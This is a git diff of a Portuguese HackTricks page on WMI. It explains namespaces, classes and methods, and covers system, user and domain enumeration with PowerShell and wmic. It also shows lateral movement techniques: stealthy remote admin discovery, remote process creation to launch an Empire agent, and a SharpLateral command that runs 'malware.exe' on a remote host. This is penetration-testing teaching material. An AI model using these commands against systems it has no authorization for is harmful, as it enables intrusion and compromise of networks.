@@ -2,102 +2,94 @@
 
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
-## Como Funciona
+## Como Funciona Explicado
 
-Wmi permite abrir processos em hosts onde você conhece o nome de usuário/(senha/Hash). Então, Wmiexec usa wmi para executar cada comando que é solicitado (é por isso que Wmicexec oferece um shell semi-interativo).
+Processos podem ser abertos em hosts onde o nome de usuário e a senha ou hash são conhecidos através do uso do WMI. Comandos são executados usando o WMI pelo Wmiexec, proporcionando uma experiência de shell semi-interativa.
 
-**dcomexec.py:** Este script oferece um shell semi-interativo semelhante ao wmiexec.py, mas usando diferentes pontos finais DCOM (objeto DCOM ShellBrowserWindow). Atualmente, ele suporta objetos MMC20. Application, Shell Windows e Shell Browser Window. (de [aqui](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Utilizando diferentes pontos de extremidade DCOM, este script oferece um shell semi-interativo semelhante ao wmiexec.py, especificamente alavancando o objeto DCOM ShellBrowserWindow. Atualmente suporta MMC20. Aplicação, Janelas do Shell e objetos de Janela do Navegador do Shell. (fonte: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## Fundamentos do WMI
 
 ### Namespace
 
-WMI é dividido em uma hierarquia estilo diretório, o contêiner \root, com outros diretórios sob \root. Esses "caminhos de diretório" são chamados de namespaces.\
-Listar namespaces:
+Estruturado em uma hierarquia de estilo de diretório, o contêiner de nível superior do WMI é \root, sob o qual diretórios adicionais, referidos como namespaces, são organizados.
+Comandos para listar namespaces:
 ```bash
-#Get Root namespaces
+# Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
 
-#List all namespaces (you may need administrator to list all of them)
+# Enumeration of all namespaces (administrator privileges may be required)
 Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 
-#List namespaces inside "root\cimv2"
+# Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-Listar classes de um namespace com:
+As classes dentro de um namespace podem ser listadas usando:
 ```bash
-gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
+gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **Classes**
 
-O nome da classe WMI, por exemplo: win32\_process, é um ponto de partida para qualquer ação WMI. Precisamos sempre saber o Nome da Classe e o Namespace onde ela está localizada.\
-Listar classes começando com `win32`:
+Conhecer o nome de uma classe WMI, como win32\_process, e o namespace em que ela reside é crucial para qualquer operação WMI.
+Comandos para listar classes começando com `win32`:
 ```bash
-Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
+Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 ```
-Chamar uma classe:
+Invocação de uma classe:
 ```bash
-#When you don't specify a namespaces by default is "root/cimv2"
+# Defaults to "root/cimv2" when namespace isn't specified
 Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
 ### Métodos
 
-Classes WMI possuem uma ou mais funções que podem ser executadas. Essas funções são chamadas de métodos.
+Métodos, que são uma ou mais funções executáveis das classes WMI, podem ser executados.
 ```bash
-#Load a class using [wmiclass], leist methods and call one
+# Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
 $c.methods
-#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
-$c.Create("c:\share\path","name",0,$null,"My Description")
-#If returned value is "0", then it was successfully executed
+# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
 ```
 
 ```bash
-#List methods
-Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
-#Call create method from win32_share class
+# Method listing and invocation
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
 ## Enumeração WMI
 
-### Verificar serviço WMI
+### Status do Serviço WMI
 
-Assim você pode verificar se o serviço WMI está em execução:
+Comandos para verificar se o serviço WMI está operacional:
 ```bash
-#Check if WMI service is running
+# WMI service status check
 Get-Service Winmgmt
-Status   Name               DisplayName
-------   ----               -----------
-Running  Winmgmt            Windows Management Instrumentation
 
-#From CMD
+# Via CMD
 net start | findstr "Instrumentation"
 ```
-### Informações do Sistema
+### Informações do Sistema e Processo
+
+Coletando informações do sistema e processo através do WMI:
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
-```
-### Informações do Processo
-```bash
 Get-WmiObject win32_process | Select Name, Processid
 ```
-Do ponto de vista de um atacante, o WMI pode ser muito valioso para enumerar informações sensíveis sobre um sistema ou o domínio.
-```
+Para os atacantes, o WMI é uma ferramenta potente para enumerar dados sensíveis sobre sistemas ou domínios.
+```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
 wmic ntdomain list /format:list
@@ -105,35 +97,19 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
+### **Consulta Remota Manual do WMI**
 
+A identificação furtiva de administradores locais em uma máquina remota e usuários logados pode ser alcançada por meio de consultas específicas do WMI. O `wmic` também suporta a leitura de um arquivo de texto para executar comandos em vários nós simultaneamente.
+
+Para executar remotamente um processo via WMI, como implantar um agente Empire, a seguinte estrutura de comando é empregada, com a execução bem-sucedida indicada por um valor de retorno "0":
 ```bash
-Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
+wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-## **Consulta Remota Manual WMI**
+Este processo ilustra a capacidade do WMI para execução remota e enumeração de sistemas, destacando sua utilidade tanto para administração de sistemas quanto para testes de penetração.
 
-Por exemplo, aqui está uma maneira muito discreta de descobrir administradores locais em uma máquina remota (observe que domínio é o nome do computador):
 
-{% code overflow="wrap" %}
-```bash
-wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
-```
-{% endcode %}
-
-Outro oneliner útil é para ver quem está logado em uma máquina (quando você está caçando administradores):
-```bash
-wmic /node:ordws01 path win32_loggedonuser get antecedent
-```
-`wmic` pode até ler nós de um arquivo de texto e executar o comando em todos eles. Se você tem um arquivo de texto de estações de trabalho:
-```
-wmic /node:@workstations.txt path win32_loggedonuser get antecedent
-```
-**Vamos criar remotamente um processo via WMI para executar um agente do Empire:**
-```bash
-wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
-```
-Vemos que foi executado com sucesso (ReturnValue = 0). E um segundo depois, nosso listener do Empire o captura. Note que o ID do processo é o mesmo que o WMI retornou.
-
-Todas essas informações foram extraídas daqui: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+# Referências
+* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 ## Ferramentas Automáticas
 
@@ -143,16 +119,18 @@ Todas essas informações foram extraídas daqui: [https://blog.ropnop.com/using
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+{% endcode %}
+
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
